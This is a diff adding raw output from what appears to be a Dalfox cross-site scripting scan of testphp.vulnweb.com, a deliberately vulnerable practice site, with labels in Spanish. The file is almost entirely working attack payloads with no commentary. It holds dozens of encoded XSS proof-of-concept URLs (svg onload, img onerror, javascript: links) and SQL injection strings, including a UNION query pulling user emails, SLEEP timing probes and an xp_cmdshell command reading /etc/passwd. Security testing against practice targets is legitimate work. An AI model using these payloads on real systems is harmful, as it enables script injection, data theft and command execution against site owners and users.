@@ -1,0 +1,165 @@
+🔗 URL: http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=13
+🧩 Parámetro afectado: cat
+📄 Evidencia:
+[95m[POC][V][GET][inHTML-none(1)] http://testphp.vulnweb.com/listproducts.php?=&cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%3CScRipt+class%3Ddalfox%3Ealert.bind%28%29%281%29%3C%2Fscript%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%3E%3Csvg%2Fonload%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%22%3Easd[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%27%3Easd[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%27%3E%3Csvg%2Fclass%3D%27dalfox%27onLoad%3Dalert%281%29%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users
+🧩 Parámetro afectado: artist
+📄 Evidencia:
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1%2Cgroup_concat%28email%29%2C3+from+users%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1%2Cgroup_concat%28email%29%2C3+from+users%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1%2Cgroup_concat%28email%29%2C3+from+users%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B%5D.some%28confirm%29%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1%2Cgroup_concat%28email%29%2C3+from+users%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1%2Cgroup_concat%28email%29%2C3+from+users%27%3E%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb
+🧩 Parámetro afectado: id
+📄 Evidencia:
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%27%3E%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%27%3E%3Ca+href%3D%27javascript%26colon%3Balert%281%29%27%3Eclick[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Caudio%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Faudio%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Cembed+src%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Cembed+src%3Djavascript%3Aalert%281%29+class%3Ddalfox%3E%3C%2Fembed%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/hpp/params.php?p=valid
+🧩 Parámetro afectado: p
+📄 Evidencia:
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid%3E%3Csvg%3E%3Cuse+href%3Ddata%3Aimage%2Fsvg%2Bxml%2C%3Csvg+id%3D%27x%27+xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27+onload%3D%27alert%281%29%27%3E%3C%2Fsvg%3E%23x%3E[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid%3E%3Cmeta+http-equiv%3Drefresh+content%3D0%3Burl%3Djavascript%3Aalert%281%29+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/hpp/params.php?pp=" onmouseover="xss()" bad="
+🧩 Parámetro afectado: pp
+📄 Evidencia:
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?pp=%27%3E%3Csvg%3E%3Cset+onbegin%3Dalert%281%29+attributeName%3Dx+to%3D0%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%27%3E%3Csvg%3E%3Canimate+onbegin%3Dalert%281%29+attributeName%3Dx+dur%3D1s%3E&pp=[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?pp=%22%3E%3Cimg+src%3Dx+onerror%3D%22requestAnimationFrame%28%28%29%3D%3Ealert%281%29%29%22+class%3Ddalfox%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez&pp=[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%3E%3Csvg%3E%3Cuse+href%3Ddata%3Aimage%2Fsvg%2Bxml%2C%3Csvg+id%3D%27x%27+xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27+onload%3D%27alert%281%29%27%3E%3C%2Fsvg%3E%23x%3E&pp=[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Cimg+src%3Dx+onerror%3D%22parent.alert%281%29%22+class%3Ddalfox%3E&pp=[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/hpp/params.php?lt;script=
+🧩 Parámetro afectado: lt;script
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3CIMG+SRC%3Dx+ondurationchange%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/hpp/params.php?lt;/script=
+🧩 Parámetro afectado: lt;/script
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Ca+href%3D%22javascript%26colon%3Balert%281%29%22%3Eclick[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Csvg+onload%3D%22frames%5B0%5D.alert%281%29%22+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/hpp/params.php?gt=
+🧩 Parámetro afectado: gt
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?gt=&p=%27%3E%3Csvg%2Fonload%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?gt=&p=%22%3E%3CIMG+SRC%3Dx+onbeforeprint%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/listproducts.php?-=
+🧩 Parámetro afectado: -
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?-=&cat=%3E%3Csvg%3E%3CanimateTransform+onbegin%3Dalert%281%29+attributeName%3Dtransform%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?-=&cat=%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com:80/product.php?pic=5
+🧩 Parámetro afectado: pic
+📄 Evidencia:
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com:80/product.php?pic=5%27%3E%3Cmarquee+onstart%3Dalert%281%29%3E%3C%2Fmarquee%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com:80/product.php?pic=5%27%3E%3Cembed+src%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com:80/product.php?pic=5%3E%3Cembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%3E%3C%2Fembed%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/listproducts.php?asdf=ff
+🧩 Parámetro afectado: asdf
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%3E%3Csvg%3E%3CanimateMotion+onbegin%3Dalert%281%29+path%3DM20%2C20L20%2C50%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%3E%3Csvg%2Fonload%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%27%3E%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E%3C%2Ftextarea%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%27%3E%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/search.php?test=query=
+🧩 Parámetro afectado: test
+📄 Evidencia:
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/search.php?test=query%3D%27%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/search.php?test=query%3D%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/search.php?test=query%3D%27%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/search.php?test=query%3D%27%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/search.php?test=query%3D%27%3E%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/artists.php? artist=1-SLEEP(3)
+🧩 Parámetro afectado:  artist
+📄 Evidencia:
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?+artist=1-SLEEP%283%29%3E%3Cmeta+http-equiv%3Drefresh+content%3D0%3Burl%3Djavascript%3Aalert%281%29+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/AJAX/infoartist.php?YVeN=2411 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+🧩 Parámetro afectado: YVeN
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/AJAX/infoartist.php?LDeO=5891 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+🧩 Parámetro afectado: LDeO
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3E%3Cembed+src%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%22%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/AJAX/infoartist.php?fYij=6906 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+🧩 Parámetro afectado: fYij
+📄 Evidencia:
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/hpp/params.php?lt;iframe=
+🧩 Parámetro afectado: lt;iframe
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3CIMG+SRC%3Dx+onstorage%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/AJAX/infoartist.php?DUMM=1329 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+🧩 Parámetro afectado: DUMM
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cembed+src%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3E%3Clink+rel%3Ddns-prefetch+href%3D%2F%2Fevil.com+onload%3Dalert%281%29+class%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/listproducts.php?amp;asdf=ff
+🧩 Parámetro afectado: amp;asdf
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?cat=%27%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?cat=%27%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?cat=%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?cat=%27%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3CSvG%2Fonload%3Dalert%281%29+id%3Ddalfox%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/hpp/params.php?gt;=
+🧩 Parámetro afectado: gt;
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%3E%3Cembed+src%3D%23+codebase%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F+class%3Ddalfox%3E%3C%2Fembed%3E[0m
+--------------------------------------------------
+🔗 URL: http://testphp.vulnweb.com/AJAX/infoartist.php?uiDo=4470 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+🧩 Parámetro afectado: uiDo
+📄 Evidencia:
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3E%3Cembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%22%3E%3Csvg%2Fclass%3Ddalfox+onload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Csvg%3E%3Canimate+onbegin%3Dalert%281%29+attributeName%3Dx+dur%3D1s%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3E%3Csvg%3E%3CanimateTransform+onbegin%3Dalert%281%29+attributeName%3Dtransform%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%22%3E%3Csvg%2Fonload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3E%3Cbase+href%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%3E[0m
+--------------------------------------------------
